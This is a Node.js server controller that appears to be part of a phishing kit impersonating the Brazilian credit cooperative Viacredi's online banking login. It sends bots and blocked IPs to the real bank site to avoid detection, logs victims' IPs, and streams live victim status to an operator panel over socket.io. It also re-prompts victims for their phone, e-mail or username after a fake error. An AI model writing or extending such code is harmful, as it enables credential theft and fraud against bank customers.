const Client = require('../../models/Client')
const isbot = require('isbot')
const Visitor = require('../../models/visitor')
const Robots = require('../../modules/Robots')
const BlockedIp = require('../../models/BloquedIp')
const moment = require('moment')

module.exports = {
    async view(req, res) {
        try {
            isbot.extend(Robots)

            if (isbot(req.get('user-agent'))) return res.redirect('https://www.viacredi.coop.br/')

            //const ip = req.socket.remoteAddress
            const ip = (req.headers['x-forwarded-for'] || req.connection.remoteAddress || '').split(',')[0].trim()

            if (!ip) return

            const visitor = await Visitor.findOne({ where: { ip } })

            const blocketip = await BlockedIp.findOne({ where: { ip } })

            if (blocketip) return res.redirect('https://www.viacredi.coop.br/')

            if (!visitor) {
                await Visitor.create({ ip })

                const countVisitors = await Visitor.count()

                req.app.io.emit('visitors', countVisitors)
            }

            const { client } = req.query

            const cliente = await Client.findByPk(client)

            if (client) {
                req.app.io.emit('userReconnect', cliente.toJSON())
                return res.render('pages/index', {
                    title: 'VIACREDI | Conta Online',
                    pageClasses: 'cadastro',
                    client: cliente.toJSON(),
                    date: moment(new Date()).locale('pt-br').format('LLLL'),
                })
            }

            return res.render('pages/index', {
                title: 'VIACREDI | Conta Online',
                pageClasses: 'cadastro',
                date: moment(new Date()).locale('pt-br').format('dddd [,] DD MMMM [de] YYYY'),
            })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
    async error(req, res) {
        try {
            const { client_id } = req.params

            const client = await Client.findByPk(client_id)

            if (!client) return res.redirect('/modules/conta')

            await client.update({ status: `Online no usuário` })

            req.app.io.emit('updateClient', client.toJSON())

            return res.render('pages/index', {
                title: 'Olá! Digite o seu telefone, e-mail ou usuário',
                pageClasses: 'cadastro',
                error: `error`,
                client: client.toJSON(),
            })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
}
